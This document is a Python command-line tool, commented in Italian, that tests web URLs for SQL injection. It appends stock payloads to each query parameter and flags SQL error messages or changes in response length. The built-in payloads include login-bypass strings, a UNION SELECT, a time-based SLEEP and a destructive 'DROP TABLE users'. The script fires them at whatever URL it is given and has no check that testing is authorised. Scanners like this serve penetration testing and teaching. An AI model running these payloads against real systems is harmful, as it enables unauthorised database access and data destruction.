#!/usr/bin/env python3
import requests
import urllib.parse
import argparse
import sys

class SQLInjectionTester:
    def __init__(self, verbose=False, payloads_file=None):
        self.verbose = verbose
        self.vulnerable_params = []
        
        # Carica i payload
        self.payloads = self.load_payloads(payloads_file)
        
        # Messaggi di errore SQL comuni da cercare
        self.error_signatures = [
            "SQL syntax",
            "mysql_fetch",
            "MySQL server",
            "You have an error in your SQL syntax",
            "ORA-",
            "Oracle error",
            "PostgreSQL",
            "driver.ODBC",
            "SQLite",
            "Incorrect syntax near",
            "ODBC SQL Server Driver",
            "Microsoft SQL Native Client"
        ]

    def load_payloads(self, filename=None):
        """Carica i payload da un file o usa quelli predefiniti"""
        default_payloads = [
            "' OR '1'='1", 
            "' OR '1'='1' --", 
            "' OR 1=1--", 
            "admin' --", 
            "admin' OR '1'='1", 
            "1' OR '1'='1'--", 
            "' UNION SELECT 1,2,3--", 
            "' AND SLEEP(5)--", 
            "1'; DROP TABLE users--" 
        ]
        
        if not filename:
            print(f"Utilizzo {len(default_payloads)} payload predefiniti")
            return default_payloads
            
        try:
            with open(filename, 'r', encoding='utf-8') as file:
                payloads = [line.strip() for line in file if line.strip() and not line.startswith('#')]
                
            if payloads:
                print(f"Caricati {len(payloads)} payload dal file {filename}")
                return payloads
            else:
                print(f"Il file {filename} non contiene payload validi. Utilizzo i payload predefiniti.")
                return default_payloads
                
        except Exception as e:
            print(f"Errore durante la lettura del file dei payload: {e}")
            print("Utilizzo i payload predefiniti")
            return default_payloads

    def check_vulnerability(self, response, original_content):
        """Verifica se la risposta indica una vulnerabilità SQL"""
        # Controlla la presenza di messaggi di errore SQL
        for signature in self.error_signatures:
            if signature in response.text:
                return True
                
        # Controlla se il contenuto è significativamente diverso
        if len(response.text) > len(original_content) * 1.5:
            return True
            
        if len(response.text) < len(original_content) * 0.5:
            return True
            
        return False

    def test_url(self, url):
        """Testa un URL per vulnerabilità SQL injection"""
        print(f"Testando SQL Injection su: {url}")
        
        # Dividi l'URL in base URL e parametri
        parsed_url = urllib.parse.urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        if not query_params:
            print("Nessun parametro trovato nell'URL. Aggiungi parametri (es: http://example.com/?id=1)")
            return
            
        print(f"Parametri trovati: {', '.join(query_params.keys())}")
        
        # Ottieni una risposta normale per confronto
        try:
            normal_response = requests.get(url, timeout=10)
            original_content = normal_response.text
        except requests.RequestException as e:
            print(f"Errore durante la richiesta all'URL originale: {e}")
            return
            
        # Testa ogni parametro con ogni payload
        for param, values in query_params.items():
            value = values[0] if values else ""
            
            for payload in self.payloads:
                # Crea l'URL con il payload
                injected_value = f"{value}{payload}"
                test_url = f"{base_url}?{param}={urllib.parse.quote(injected_value)}"
                
                if self.verbose:
                    print(f"Testing: {test_url}")
                
                try:
                    # Esegui la richiesta
                    response = requests.get(test_url, timeout=10)
                    
                    # Verifica se la risposta indica una vulnerabilità
                    if self.check_vulnerability(response, original_content):
                        print(f"\nPossibile vulnerabilità SQL injection trovata!")
                        print(f"Parametro: {param}")
                        print(f"Payload: {payload}")
                        print(f"URL: {test_url}")
                        
                        if param not in self.vulnerable_params:
                            self.vulnerable_params.append(param)
                            
                except requests.RequestException as e:
                    if self.verbose:
                        print(f"Errore durante il test di {param} con {payload}: {e}")
        
        # Riepilogo finale
        if self.vulnerable_params:
            print(f"\nParametri vulnerabili trovati: {', '.join(self.vulnerable_params)}")
        else:
            print("\nNessuna vulnerabilità SQL injection rilevata.")

    def sql_injector_manager(self):
        parser = argparse.ArgumentParser(description='Tool semplice per testare vulnerabilità SQL Injection')
        parser.add_argument('url', help='URL da testare (es: http://example.com/?id=1)')
        parser.add_argument('-v', '--verbose', action='store_true', help='Mostra informazioni dettagliate')
        parser.add_argument('-p', '--payloads', help='File contenente i payload SQL injection (uno per riga)')
        
        args = parser.parse_args()
        
        # Verifica che l'URL contenga lo schema
        if not args.url.startswith(('http://', 'https://')):
            print("L'URL deve iniziare con 'http://' o 'https://'")
            sys.exit(1)
        
        # Esegui il test
        tester = SQLInjectionTester(
            verbose=args.verbose,
            payloads_file=args.payloads
        )
        
        tester.test_url(args.url)